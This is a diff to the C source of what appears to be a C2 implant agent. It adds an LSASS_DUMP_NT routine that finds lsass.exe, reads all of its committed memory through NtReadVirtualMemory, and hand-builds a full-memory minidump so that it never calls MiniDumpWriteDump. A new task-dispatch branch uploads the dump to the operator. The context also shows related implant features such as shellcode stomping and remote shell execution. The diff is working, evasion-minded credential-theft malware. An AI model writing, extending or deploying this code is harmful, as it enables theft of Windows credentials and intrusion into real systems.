@@ -18,6 +18,7 @@
 #include <string.h>
 #include <stdio.h>
 #include <ctype.h>
+#include <time.h>
 #define SECURITY_WIN32
 #include <secext.h>
 #include "api_resolve.h"
@@ -302,6 +303,182 @@ static void json_get_str(const char *json, const char *key, char *out, size_t ou
         p++;
     }
     out[i] = '\0';
+}
+
+// ── LSASS_DUMP_NT ─────────────────────────────────────────────────────────────
+// Builds a minimal valid MDMP via NtReadVirtualMemory; no MiniDumpWriteDump call.
+// Returns heap-allocated buffer (caller must free) or NULL on failure.
+// *out_len receives the buffer size.
+
+static uint8_t *lsass_dump_nt(DWORD lsas_pid, size_t *out_len) {
+    *out_len = 0;
+
+    /* resolve NtReadVirtualMemory */
+    typedef LONG (NTAPI *NtReadVM_t)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    NtReadVM_t ntReadVM = hNtdll ? (NtReadVM_t)GetProcAddress(hNtdll, "NtReadVirtualMemory") : NULL;
+    if (!ntReadVM) return NULL;
+
+    /* find lsass PID if not provided */
+    if (!lsas_pid) {
+        HANDLE snap0 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if (snap0 != INVALID_HANDLE_VALUE) {
+            PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
+            if (Process32First(snap0, &pe)) {
+                do {
+                    if (_stricmp(pe.szExeFile, "lsass.exe") == 0) { lsas_pid = pe.th32ProcessID; break; }
+                } while (Process32Next(snap0, &pe));
+            }
+            CloseHandle(snap0);
+        }
+    }
+    if (!lsas_pid) return NULL;
+
+    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, lsas_pid);
+    if (!hProc) return NULL;
+
+    /* enumerate modules */
+    typedef struct { uint64_t base; uint32_t sz; char name[256]; } ModInfo;
+    ModInfo *mods = NULL; int n_mods = 0, cap_mods = 0;
+    HANDLE snap1 = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, lsas_pid);
+    if (snap1 != INVALID_HANDLE_VALUE) {
+        MODULEENTRY32 me; me.dwSize = sizeof(me);
+        if (Module32First(snap1, &me)) {
+            do {
+                if (n_mods >= cap_mods) { cap_mods = cap_mods ? cap_mods*2 : 64; mods = (ModInfo*)realloc(mods, cap_mods*sizeof(ModInfo)); }
+                mods[n_mods].base = (uint64_t)(uintptr_t)me.modBaseAddr;
+                mods[n_mods].sz   = me.modBaseSize;
+                strncpy(mods[n_mods].name, me.szModule, 255); mods[n_mods].name[255] = 0;
+                n_mods++;
+            } while (Module32Next(snap1, &me));
+        }
+        CloseHandle(snap1);
+    }
+
+    /* enumerate committed memory regions */
+    typedef struct { uint64_t addr, sz; uint8_t *buf; } MemReg;
+    MemReg *regs = NULL; int n_regs = 0, cap_regs = 0;
+    SIZE_T cur = 0;
+    while (1) {
+        MEMORY_BASIC_INFORMATION mbi;
+        if (!VirtualQueryEx(hProc, (LPCVOID)cur, &mbi, sizeof(mbi))) break;
+        if (mbi.State == MEM_COMMIT) {
+            uint8_t *rbuf = (uint8_t*)malloc(mbi.RegionSize);
+            if (rbuf) {
+                SIZE_T nRead = 0;
+                ntReadVM(hProc, mbi.BaseAddress, rbuf, mbi.RegionSize, &nRead);
+                if (nRead > 0) {
+                    if (n_regs >= cap_regs) { cap_regs = cap_regs ? cap_regs*2 : 256; regs = (MemReg*)realloc(regs, cap_regs*sizeof(MemReg)); }
+                    regs[n_regs].addr = (uint64_t)(uintptr_t)mbi.BaseAddress;
+                    regs[n_regs].sz   = nRead;
+                    regs[n_regs].buf  = rbuf;
+                    n_regs++;
+                } else free(rbuf);
+            }
+        }
+        SIZE_T next = (SIZE_T)mbi.BaseAddress + mbi.RegionSize;
+        if (next <= cur) break;
+        cur = next;
+    }
+    CloseHandle(hProc);
+
+    /* build MDMP */
+    #define MOD_ENT_SZ 108
+    #define SYS_INFO_SZ 56
+    int dir_off     = 32;
+    int sys_info_off= dir_off + 3*12;           /* 68 */
+    int mod_list_off= sys_info_off + SYS_INFO_SZ; /* 124 */
+
+    /* build module name blobs (MINIDUMP_STRING = ULONG32 len + UTF-16 + null) */
+    typedef struct { int rva; uint8_t *blob; int blob_len; } NameBlob;
+    NameBlob *names = (NameBlob*)calloc(n_mods, sizeof(NameBlob));
+    int name_off = mod_list_off + 4 + n_mods * MOD_ENT_SZ;
+    for (int i = 0; i < n_mods; i++) {
+        int namelen = (int)strlen(mods[i].name);
+        int blen = 4 + (namelen + 1) * 2; /* ULONG32 + UTF-16 chars + null */
+        uint8_t *blob = (uint8_t*)calloc(1, blen);
+        uint32_t cb = (uint32_t)(namelen * 2); /* byte count excl null */
+        memcpy(blob, &cb, 4);
+        for (int j = 0; j < namelen; j++) { blob[4 + j*2] = (uint8_t)mods[i].name[j]; blob[4+j*2+1] = 0; }
+        names[i].rva = name_off; names[i].blob = blob; names[i].blob_len = blen;
+        name_off += blen;
+    }
+
+    int mem64_off    = name_off;
+    int mem64_hdr_len= 8 + 8 + n_regs * 16;
+    int data_off     = mem64_off + mem64_hdr_len;
+    size_t total_data = 0;
+    for (int i = 0; i < n_regs; i++) total_data += regs[i].sz;
+    size_t total_len = (size_t)data_off + total_data;
+
+    uint8_t *buf = (uint8_t*)calloc(1, total_len);
+    if (!buf) goto done;
+
+    #define WU32(off,v) do { uint32_t _v=(uint32_t)(v); memcpy(buf+(off),&_v,4); } while(0)
+    #define WU64(off,v) do { uint64_t _v=(uint64_t)(v); memcpy(buf+(off),&_v,8); } while(0)
+    #define WU16(off,v) do { uint16_t _v=(uint16_t)(v); memcpy(buf+(off),&_v,2); } while(0)
+
+    /* MINIDUMP_HEADER */
+    WU32(0,  0x504d444dU);
+    WU32(4,  0x0000a793U);
+    WU32(8,  3);          /* NumberOfStreams */
+    WU32(12, dir_off);
+    WU32(20, (uint32_t)time(NULL));
+    WU64(24, 2);          /* Flags = MiniDumpWithFullMemory */
+
+    /* directories */
+    WU32(dir_off,     7); WU32(dir_off+4,  SYS_INFO_SZ);               WU32(dir_off+8,  sys_info_off);
+    WU32(dir_off+12,  4); WU32(dir_off+16, mem64_off - mod_list_off);   WU32(dir_off+20, mod_list_off);
+    WU32(dir_off+24,  9); WU32(dir_off+28, mem64_hdr_len);              WU32(dir_off+32, mem64_off);
+
+    /* SystemInfo at sys_info_off */
+    WU16(sys_info_off,    9);     /* PROCESSOR_ARCHITECTURE_AMD64 */
+    WU16(sys_info_off+2,  6);     /* ProcessorLevel */
+    buf[sys_info_off+6] = 1;      /* NumberOfProcessors */
+    buf[sys_info_off+7] = 1;      /* ProductType */
+    WU32(sys_info_off+8,  10);    /* MajorVersion */
+    WU32(sys_info_off+12, 0);     /* MinorVersion */
+    WU32(sys_info_off+16, 19041); /* BuildNumber */
+    WU32(sys_info_off+20, 2);     /* PlatformId */
+
+    /* ModuleList */
+    WU32(mod_list_off, n_mods);
+    for (int i = 0; i < n_mods; i++) {
+        int e = mod_list_off + 4 + i * MOD_ENT_SZ;
+        WU64(e,    mods[i].base);
+        WU32(e+8,  mods[i].sz);
+        WU32(e+20, names[i].rva);
+    }
+    for (int i = 0; i < n_mods; i++) {
+        memcpy(buf + names[i].rva, names[i].blob, names[i].blob_len);
+    }
+
+    /* Memory64List */
+    WU64(mem64_off,   n_regs);
+    WU64(mem64_off+8, data_off);
+    for (int i = 0; i < n_regs; i++) {
+        int e = mem64_off + 16 + i * 16;
+        WU64(e,   regs[i].addr);
+        WU64(e+8, regs[i].sz);
+    }
+
+    /* raw data */
+    { size_t pos = data_off;
+      for (int i = 0; i < n_regs; i++) { memcpy(buf+pos, regs[i].buf, regs[i].sz); pos += regs[i].sz; } }
+
+    *out_len = total_len;
+
+done:
+    for (int i = 0; i < n_mods; i++) free(names[i].blob);
+    free(names); free(mods);
+    for (int i = 0; i < n_regs; i++) free(regs[i].buf);
+    free(regs);
+    return buf;
+    #undef MOD_ENT_SZ
+    #undef SYS_INFO_SZ
+    #undef WU32
+    #undef WU64
+    #undef WU16
 }
 
 // ── SHELLCODE_STOMP ───────────────────────────────────────────────────────────
@@ -2113,6 +2290,20 @@ void dispatch_task(AgentTask *task) {
                 }
             }
         }
+    }
+    else if (strcmp(type_upper, "LSASS_DUMP_NT") == 0) {
+        DWORD lsas_pid = 0;
+        if (args && args[0] && args[0] != '{') lsas_pid = (DWORD)strtoul(args, NULL, 10);
+        size_t dump_len = 0;
+        uint8_t *dump = lsass_dump_nt(lsas_pid, &dump_len);
+        if (!dump || dump_len == 0) {
+            agent_send_result(task->id, "", "lsass_dump_nt: failed (need admin?)");
+        } else {
+            agent_upload_file(task->id, "lsass_nt.dmp", dump, dump_len);
+            char msg[64]; snprintf(msg,sizeof(msg),"[+] lsass NT dump: %zu bytes", dump_len);
+            agent_send_result(task->id, msg, "");
+        }
+        free(dump);
     }
     else if (strcmp(type_upper, "ENV") == 0) {
         char *out = run_shell("set 2>&1"); agent_send_result(task->id, out, ""); free(out);
